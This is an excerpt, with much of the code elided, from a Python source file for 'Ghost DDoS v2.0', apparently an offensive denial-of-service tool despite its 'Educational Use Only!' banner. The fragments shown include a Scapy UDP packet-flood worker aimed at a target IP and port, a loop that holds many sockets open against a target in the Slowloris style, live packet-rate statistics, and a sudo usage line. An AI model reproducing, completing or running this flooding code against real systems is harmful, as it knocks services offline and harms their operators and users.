...
class GhostDDoS:
    ...
    ╠═╣║ ║║ ║╠╦╝ ║ ╠═╣╠╦╝
    ╩ ╩╚═╝╚═╝╩╚═ ╩ ╩ ╩╩╚═
        """ + Fore.YELLOW + "      Ghost DDoS v2.0 by jusot99" + Fore.CYAN + "\n        Educational Use Only!\n")
    ...
    def show_stats(self):
        ...
        while self.running:
            ...
            print(f"\r{Fore.CYAN}{spinner} {Fore.YELLOW}Packets: {self.packets_sent} | {Fore.GREEN}Rate: {rate:.1f} pkt/s | {Fore.MAGENTA}Time: {elapsed:.1f}s", end="", flush=True)
            time.sleep(0.1)
        ...
        def worker():
            while self.running:
                try:
                    ...
                    pkt = IP(dst=target_ip)/UDP(sport=src_port, dport=target_port)/Raw(load=payload)
        ...
        try:
            ...
            for i in range(sockets):
                try:
                    ...
                    connected_count += 1
                    print(f"{Fore.GREEN}[+] Socket {connected_count}/{sockets} connected", end="\r")
            ...
            while True:
                for s in sockets_list[:]:  # Use slice copy for safe iteration
                    try:
                        ...
                        print(f"{Fore.RED}[-] Socket disconnected, {len(sockets_list)} remaining")
...
def main():
    ...
    if len(sys.argv) < 3:
        print(f"{Fore.CYAN}Usage: sudo python3 {sys.argv[0]} <target_ip> <target_port> [options]")
